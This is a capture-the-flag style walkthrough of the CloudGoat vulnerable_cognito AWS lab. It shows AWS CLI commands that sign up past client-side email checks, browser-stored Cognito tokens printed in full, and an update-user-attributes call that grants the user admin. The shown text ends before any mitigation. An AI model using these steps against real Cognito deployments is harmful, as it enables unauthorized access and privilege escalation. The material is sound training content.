# CloudGoat Scenario 2: vulnerable_cognito (Small / Moderate): WalkThrough and Mitigation

Hey hi, Soumyanil is back but with Cloud now, let’s have a look into AWS Penetration Testing. I will be covering all the scenarios provided by the CloudGoat vulnerable AWS environment by Rhinosecurity Labs.

**CloudGoat** is **Rhino Security Labs**’ “_Vulnerable by Design_” AWS deployment tool. It allows us to hone our cloud cybersecurity skills by creating and completing several **CTF** style scenarios. Each and every scenario is composed of AWS resources arranged together to create a structured learning experience. These scenarios vary in difficulty and many offer multiple paths to Flag/Goal.

From ***Purple Team point of View***:\
i. Our mission to perform Recon, identify vulnerabilities, and perform exploitation in order to achieve the scenario objective.\
ii. Provide Mitigation for the above Flaw that we came accross.

### <ins>Details about the Scenario :</ins>
i. In this scenario, you are presented with a signup and login page with AWS Cognito in the backend.\
ii. You need to :\
&nbsp;&nbsp;Objective A. ***Bypass restrictions*** \
&nbsp;&nbsp;Objective B. ***Exploit Misconfigurations in Amazon Cognito*** in order :\
&nbsp;&nbsp;&nbsp;&nbsp;1. ***To Elevate your privileges***\
&nbsp;&nbsp;&nbsp;&nbsp;2. ***and get Cognito Identity Pool credentials***

I will be using Kali Linux VM to Spin Up the Vulnerable Lab Setup.

### CloudGoat SetUp:

To install [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat/):
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
chmod +x cloudgoat.py
```
### NOTE:
Please setup the AWS CLI and AWS account prior to the above commands and create a user with name “cloudgoat” having permission for CLI connections.

### 1. Setting Up Scenario 2: vulnerable_cognito (Small / Moderate):
```bash
./cloudgoat.py create vulnerable_cognito
```
![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/1.ScenarioSetUp.png?raw=true)

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/2.ScenarioSetUp.png?raw=true)



Q. BTW, What is **Amazon Cognito** ? \
Ans: According to [AWS](https://docs.aws.amazon.com/cognito/latest/developerguide/what-is-amazon-cognito.html):

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/3.AmazonCognito.png?raw=true)

> So basically, **Amazon Cognito** is a User Identity and Data Syncronization Service, which gives User a very easy time to manage their accounts connected Over Mutiple Electronic Devices. 

### Let's Start:

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ cat vulnerable_cognito_cgidgxpcecu5yc/start.txt 

apigateway_url = https://ht0ueqmd17.execute-api.us-east-1.amazonaws.com/vulncognito/cognitoctf-vulnerablecognitocgid2jkmefusdh/index.html
cloudgoat_output_aws_account_id = 572769290600
```

Let's Navigate to the site and signing up:

![image](https://github.com/reveng007/blog/assets/61424547/9a63d938-79fc-42fa-a4f1-05ac6cef5642)

Now using [temp-mail](https://temp-mail.org/en/), I tried to Sign-Up but I failed!

![](https://github.com/reveng007/reveng007.github.io/blob/main/CloudGoat/2.Scenarios-vulnerable_cognito%20(Small%20or%20Moderate)/5.SignUpEmailValidationError.png?raw=true)

### <ins>***Objective A: Bypassing email (client-side validation Check) restrictions***</ins>:

#### 1. Inspecting Source code of Webpage:

![image](https://github.com/reveng007/blog/assets/61424547/eb805432-0ac9-4897-8d2e-1aea2eb17721)

Got this Creds:
```bash
UserPoolId: 'us-east-1_mYaVxhwr7'
ClientId: '4u4i11pmknfa2k6flrur6c3a5v'
```

#### 2. Bypassing email Client-Side validation Checks/ restrictions via AWS CLI:

Let us use this _retireved_ `ClientId` to SignUp Via AWS CLI, which would bypass _`email Client-Side validation Check/restriction`_.

```bash
aws cognito-idp sign-up --client-id [Client-id] --username [temp-mail email address] --password [add-password] --region [region] --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
```

```bash
┌──(kali㉿kali)-[~/AWS/BLOG_AWS/cloudgoat]
└─$ aws cognito-idp sign-up --client-id 4u4i11pmknfa2k6flrur6c3a5v --username yeripan911@bitofee.com --password Passw0rd! --region us-east-1 --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]'
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "y***@b***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "3072f385-94fb-4eff-8371-829f7610af7e"
}
```

Got the Verfication code here in [temp-mail](https://temp-mail.org/en/):

![image](https://github.com/reveng007/blog/assets/61424547/be639a28-d5b6-4695-baf6-ce8fc003f299)

Now, confirming the registration:

```bash
aws cognito-idp confirm-sign-up --region [region] --client-id [ClientId] --username [temp-mail email address] --confirmation-code '[Verfication code in temp mail]'
```

![image](https://github.com/reveng007/blog/assets/61424547/13bafeef-be9b-475f-be2b-61a4f63e4805)

#### 3. Logging in now : [[TA0001](https://attack.mitre.org/tactics/TA0001/) - Initial Access]:

![image](https://github.com/reveng007/blog/assets/61424547/9b52c5c1-d464-4b0e-8361-0e9ab9e6d5c0)

![image](https://github.com/reveng007/blog/assets/61424547/82bac71b-71f6-4a64-8aa9-62016d5f5ee1)

### <ins>***Objective B. Exploit Misconfigurations in Amazon Cognito***</ins>: [[T1134](https://attack.mitre.org/techniques/T1134/) - PrivEsc: Access Token Manipulation]:

#### 1. With Inspect option, got some tokens stored in Storage Menu:

![image](https://github.com/reveng007/blog/assets/61424547/54d14ac6-f971-4e21-a6fd-d8eb888fc20a)

```bash
accessToken : eyJraWQiOiJGZzVTQWdsclBCczVxcEVLamhnVUhoTVdETGRzUXhQVzZSMzIyZG9pS2V3PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9tWWFWeGh3cjciLCJjbGllbnRfaWQiOiI0dTRpMTFwbWtuZmEyazZmbHJ1cjZjM2E1diIsIm9yaWdpbl9qdGkiOiJhYWM3NjA0Mi02YmRmLTRiODYtYmEzMy01ZjE1NWIyNDkzMzUiLCJldmVudF9pZCI6IjUyOGY0NWIxLTg3MGQtNGVmNC1hOWY2LTEwNWQ0MDIzNmU2NCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3MDY2MDQwOTIsImV4cCI6MTcwNjYwNzY5MiwiaWF0IjoxNzA2NjA0MDkyLCJqdGkiOiIwMTk3ZjhhZC0wZjY3LTQwZjAtOWQ5Ny0wYTAxNGQ3OTZiYjIiLCJ1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSJ9.ihfBEzP-VfdOJsk_wYyi99-SRH0ymo0l2dSmUkEsa6sgQFlEfxj6D4n5LAeBLEGJLoBn5Z_lnvh5uS84LZf6kXiocjxtdC6pALBJFyZRq6tDNUbN_WfrWkSuEbYV1wsDzIehbWU5dCrNAAC8__0wawbJZZF-KpRk5msZPwN2oiYbEsWb2SQE4Pw8gWhjbYblhl0VxpN0kjA_2nmi4CbXFmTci67AHVH7MJDX79Sx1zIQPwPLRUGbE58Yunjo71lpw1ud3QqFSA1BsTz2wly5oSr6RiHEeX1lxepqRJ5Kt9xC60uF7zGQBlCWdegFf3mOm-Ugbu1tQ2khEawm9g1nTw

idToken : 
eyJraWQiOiI3N2JsaEwrYjBwaTNYSzlOVG9UQUFxeGdObVZMUmxFRVBjRVRIbUMzQUpnPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfbVlhVnhod3I3IiwiY29nbml0bzp1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSIsImdpdmVuX25hbWUiOiJsb3JlbSIsImN1c3RvbTphY2Nlc3MiOiJyZWFkZXIiLCJvcmlnaW5fanRpIjoiYWFjNzYwNDItNmJkZi00Yjg2LWJhMzMtNWYxNTViMjQ5MzM1IiwiYXVkIjoiNHU0aTExcG1rbmZhMms2ZmxydXI2YzNhNXYiLCJldmVudF9pZCI6IjUyOGY0NWIxLTg3MGQtNGVmNC1hOWY2LTEwNWQ0MDIzNmU2NCIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzA2NjA0MDkyLCJleHAiOjE3MDY2MDc2OTIsImlhdCI6MTcwNjYwNDA5MiwiZmFtaWx5X25hbWUiOiJpcHN1bSIsImp0aSI6ImY0OTljMmFkLTk5NTQtNGJhMC05Yzg2LWVlYWJlNjRiOTVkYiIsImVtYWlsIjoieWVyaXBhbjkxMUBiaXRvZmVlLmNvbSJ9.n2qxAqrVu4ibtvi326vglqY6o-WoII_gRAANt7SbkpnBXvPRkBsypKBM_pVjIXAKoNsjBOyKrb8AC6oPpSiEHkxPfFCmfCDFD_WFQcSIxn-DONjorCZmF8nkq56cPQdI_VrQbuxZyrxOVE_nNjN393oNs2ow2lj8G8nQoorOd7uU4L3dYfk7Ip1YsZReXU-93cM6la8heRET-eS5xS_uMIXk9NQwxf5oFCyuQbK4rNJTUfF7C2IAXcS5hJs22sNseV9wDOsUAuZjnsUFj4HnYQTBpJgVUiZFNRJ71585TBTJtpW-7OAMq3N9qpSrs7MbpVVOtKBzJ1KewLemBALq1Q

refreshToken : 
eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.VThqXR3jTXZXvHN8XBhPaZZPyvj4bOi6F7S_GMt37_TtcDcpbJ60u8gv5v8uG48GX9woHis7w-ma0FE_gNTSB6cETcYM-If1K_eC3_AiGSyI3vEkqmDtiZtgKaF26eDN-8k1di5mO4w2oYE9uG6L91YPdwUTA8do9WIo1bp7WVJwqFeS1jHKt8h9xmHoeUk4lpQodyWO_92EzBPyr5VRvohjXQ1EL2K8BtWIwvPfGZ1zumKcrhALnUR0lCtYgiFUcWg0iyrli58a2NQbAHW9iLeNo1XU4Kghj5FBFm4seP3tQXzWjK4A5TkWai2ZglOx3RPHieR1JiAhblPohb5gnA.xffrQ7sx_oHI6FRh.M9AvkGOSW4OFWRUuLmbKaeJb8LoNpTNnQlxPL4PP_5aJ7-5hJJPb_GYPVLUUSmDKrbWi1E8qt7A0iTSJnk5M3nUJuOHWVVKQ4tmKutTVQ0aY2STDUtUXu3iIbav4dwUyW5Hg5BDm_G9B8HE0RlkspY6dUrmn7qIFN3zsl4N9qAb3WPLyTsgj1BxfS3YSDrLL2XGBuBxlJ3Wft_s-r_setAwlLfzB4OAR0OM8piYWuDEIVKVokvR5JXz3jmQmpm-5I8pFEgG02x9WyvVCW3bZTabqICRZw2jUHVDv1dWVYG8xdEBmalhHMzDEP0WUY_ZKq7xnEMzUa6OgCnlMvMeePuOgnSfI48h-4UTgRYShbZJpOPlXkc43csYzGKIWBA_SmRMtDjdT6VwqwLzpDgPablhADVsnuFiXUi6yD6gEr_U8VxStNRrjmGWT59QzayyLOPu6Mnf9LLbsFybNIBr05JJ6gFkWR_8Tcjm1pS8287grUTiOpJ8svA1oAoiWyuvBdI2IC3RGllc7ZdLe6OCF01Abo9gDjr_1x1ebSAhsI7Ruzngn2Y_Uvkg78S3fAs0l-i4g4tj8oQ5fGa7qfvA_i64xpJvsHmYCFznxNxztZJriilY6AFcXRZ04vddKWiqBKz1BleVV2JN-sqqCkUr72i6LwaIm7UR4mqp-QiScurfaxOJdhEET_n7Rw-9iBlQuMD914L8pc6W-LBFuyeVj3M7V0aTXBDLpeRObow66AL7Ji_cGWYYlZmkYxAMIabdfhvNTZeH6KDqrCtDYWSmOe6CgkG0jffb_WnErLfcJtjf747xvwLrcs5kVGggf_sUE7LL9sr3OqHfe9hBd4gxaLSbD00WN7r5nKjLVadFXUhb288DmRE0sc1BfbLLYB7beewbdHHHKWew8ZtbzZm2dlv51G6wpdmc3AmNWLP0wHFnChD_LGDIVLugORY4FVBUe7qRtrYyPJ0v-XOcclF3VZcXSxxbExAFiCMiYJ6ut6HiMr0xF1vdMj94iFbJ26h7jwRBhr2S6nlVrONwajf9YcAddWlMtnDumfhTrK-57nlPCuEsQrlUCqcA5hPiCuWR5G5gchU76Z_PqxQbwp8TIWMd6uVtbYaDnmWuGdtfzZ_ohHU3y3ip5XF7ZgilQuYwjjfVeYbDw5_QDCRdOS4nbe5vIiVUwBC5vKHYWHdmDbfgRFcYL-KxvCHhXx7fDMrTBXPGvc5xaLQtx27FO2I0hNtYQRFvpiefF79B3UbaAWm7GdSma-wKi98q6eXKA73fpiTAqqb5yI2CT-t5-PKMCj7mh51H-mDa1r7uqwyrI2W190oXXWOvpAeIO7b8.s5OPY_91iz_kTjtNqKGztQ

LastAuthUser : 
3072f385-94fb-4eff-8371-829f7610af7e
```

#### 2. With the `accessToken`, I can perform PrivEsc: <ins>B.1. ***To Elevate our privileges***</ins>:

We are now granting ourselves **Admin** rights:

```bash
aws cognito-idp update-user-attributes --region [region] --access-token [AccessToken] --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
```

![image](https://github.com/reveng007/blog/assets/61424547/26906b11-f0b4-468c-a548-c92f1a4380de)



